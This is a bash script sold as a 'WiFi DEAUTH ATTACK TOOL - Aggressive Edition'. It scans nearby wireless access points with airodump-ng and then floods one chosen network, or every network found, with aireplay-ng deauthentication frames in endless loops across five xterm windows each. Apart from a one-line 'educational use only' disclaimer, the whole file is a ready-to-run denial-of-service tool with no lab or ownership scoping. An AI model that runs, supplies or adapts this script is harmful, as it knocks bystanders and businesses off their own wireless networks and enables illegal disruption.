#!/bin/bash

if [[ $EUID -ne 0 ]]; then 
    echo -e "\e[31m[!] Root access is required. Run this script as root.\e[0m"
    exit 1
fi

sudo apt install -y aircrack-ng xterm

for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
  if ! command -v "$cmd" &>/dev/null; then 
    echo -e "\e[31m[!] $cmd not found. Please install it.\e[0m"
    exit 1
  fi
done

RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m";
PURPLE="\e[35m"; BLUE="\e[34m"; RESET="\e[0m"; BOLD="\e[1m"

attack_animation() {
    local i=0
    local frames=("💥" "🔥" "⚡" "💣")
    while true; do
        printf "\r${RED}${BOLD}%s ATTACK IN PROGRESS ${PURPLE}%s${RESET}" "${frames[$i]}" "${frames[$i]}"
        i=$(((i+1) % 4))
        sleep 0.3
    done
}

clear
echo -e "${RED}${BOLD}"
echo "         .__  _____.__              __                                      "
echo " __  _  _|__|/ ____\__|            |__|____    _____   _____   ___________  "
echo " \ \/ \/ /  \   __\|  |  ______    |  \__  \  /     \ /     \_/ __ \_  __ \ "
echo "  \     /|  ||  |  |  | /_____/    |  |/ __ \|  Y Y  \  Y Y  \  ___/|  | \/ "
echo "   \/\_/ |__||__|  |__|        /\__|  (____  /__|_|  /__|_|  /\___  >__|    "
echo "                               \______|    \/      \/      \/     \/        "
echo -e "${RESET}"
echo -e "${CYAN}WiFi DEAUTH ATTACK TOOL - Aggressive Edition${RESET}"
echo -e "${RED}${BOLD}⚠️  Disclaimer: ${RESET}This tool is for educational use only. I am not responsible for misuse."
echo -e "                                                  by ${BOLD}${GREEN}RAEF${RESET}"
echo -e "\n"

mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo -e "${RED}[!] No wireless interfaces found.${RESET}"
    exit 1
fi

echo -e "\n${YELLOW}${BOLD}Available Interfaces:${RESET}"
for i in "${!interfaces[@]}"; do 
    echo -e " ${GREEN}[$i]${RESET} ${BLUE}${interfaces[$i]}${RESET}"
done
read -p "Select interface: " iface_idx
iface="${interfaces[$iface_idx]}"

echo -e "\n${CYAN}🔧 Enabling monitor mode on ${YELLOW}$iface${CYAN}...${RESET}"
airmon-ng check kill &>/dev/null
ip link set "$iface" down
iw dev "$iface" set type monitor
ip link set "$iface" up
iw dev "$iface" set power_save off


scan_file="scan_$(date +%s)"
echo -e "\n${GREEN}📡 Scanning for targets - window will auto close in 10s...${RESET}"
sleep 2
xterm -T "WiFi Scan" -geometry 100x30 -e "timeout 10s airodump-ng --write $scan_file --output-format csv $iface" &
scan_pid=$!

for i in {9..1}; do
    echo -ne "\r${CYAN}⏱️  Time remaining: $i seconds${RESET}"
    sleep 1
done
echo -e "\r${GREEN}✅ Scan complete.${RESET}"


csv_file="${scan_file}-01.csv"
if [[ ! -f "$csv_file" ]]; then 
    echo -e "${RED}[!] No networks detected.${RESET}"
    exit 1
fi

mapfile -t aps < <(awk -F',' '
  NR > 1 && $1 ~ /^[0-9A-F:]{17}$/ && $14 != "" {
    gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $4); gsub(/^ +| +$/, "", $14);
    print $1 "|" $4 "|" $14
  }' "$csv_file" 2>/dev/null)

if [[ ${#aps[@]} -eq 0 ]]; then
    echo -e "${RED}[!] No viable AP targets found.${RESET}"
    exit 1
fi

echo -e "\n${PURPLE}${BOLD}🎯 Detected Networks:${RESET}"
echo -e "${YELLOW}------------------------------------------------${RESET}"
printf "${BOLD}%-20s %-4s %s${RESET}\n" "BSSID" "CH" "ESSID"
for ap in "${aps[@]}"; do
    IFS='|' read -r bssid channel essid <<< "$ap"
    printf "%-20s %-4s %s\n" "$bssid" "$channel" "$essid"
done
echo -e "${YELLOW}------------------------------------------------${RESET}"
echo -e "${RED}${BOLD}Total networks found: ${#aps[@]}${RESET}"

echo -e "\n${CYAN}${BOLD}[0] Global Attack - All Networks"
echo -e "[1] Single Network Target${RESET}"
read -p "Choose attack mode [0/1]: " mode

if [[ "$mode" == "1" ]]; then
    echo -e "\n${YELLOW}Select the target network index:${RESET}"
    for i in "${!aps[@]}"; do
        IFS='|' read -r bssid channel essid <<< "${aps[$i]}"
        echo -e "${GREEN}[$i]${RESET} $essid (CH: $channel)"
    done
    read -p "Target index: " sel
    selected=("${aps[$sel]}")
else
    selected=("${aps[@]}")
fi

cleanup() {
    echo -e "\n${YELLOW}${BOLD}⚙️  Stopping attacks and restoring interface...${RESET}"
    killall aireplay-ng xterm &>/dev/null
    ip link set "$iface" down
    iw dev "$iface" set type managed
    ip link set "$iface" up
    service NetworkManager restart &>/dev/null
    rm -f "$csv_file" "$scan_file"-*
    echo -e "${GREEN}${BOLD}✅ Network restored. Goodbye.${RESET}"
    exit 0
}
trap cleanup INT

echo -e "\n${CYAN}${BOLD}⚠️  WARNING: You are about to launch the attack!${RESET}"
read -p "Press ENTER to begin the assault or CTRL+C to cancel..."


echo -e "\n${RED}${BOLD}💣 Launching attack...${RESET}"
attack_animation &
attack_pid=$!

for ap in "${selected[@]}"; do
  IFS='|' read -r bssid channel essid <<< "$ap"
  iw dev "$iface" set channel "$channel"
  for i in {1..5}; do
    xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $essid" \
      -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
    sleep 0.2
  done
  sleep 2
  read -p "\nPress ENTER to stop attack and restore your network..."
  kill $attack_pid
  cleanup
  break
  done
#by raef 
